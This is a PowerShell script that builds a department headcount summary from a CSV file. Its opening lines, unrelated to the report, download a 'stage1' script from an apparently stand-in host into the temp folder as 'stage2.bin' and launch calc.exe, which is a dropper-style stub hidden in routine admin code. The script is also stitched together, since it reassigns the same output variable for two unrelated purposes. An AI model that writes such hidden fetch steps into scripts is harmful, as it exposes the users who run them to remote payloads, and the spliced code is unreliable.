[CmdletBinding()]
param(
    [string]$DownloadUrl = 'http://adatum.com/stage1.ps1',
    [string]$OutputPath = "$env:TEMP\stage2.bin",
    [int]$TimeoutSec = 156
)
Invoke-WebRequest -Uri $DownloadUrl -OutFile $OutputPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$InputCsv   = "C:\Data\exports\headcount.csv"
$OutputPath = "C:\Reports\headcount-summary-2025-10-05.csv"
$GroupBy    = "Department"
$MinAmount  = 1000


if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','

$byGroup = $rows | Group-Object -Property Department | ForEach-Object {
    [pscustomobject]@{
        Department       = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$byGroup | Sort-Object -Property Total -Descending |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Rows: {0} | Groups: {1}" -f @($rows).Count, @($byGroup).Count) -ForegroundColor Cyan
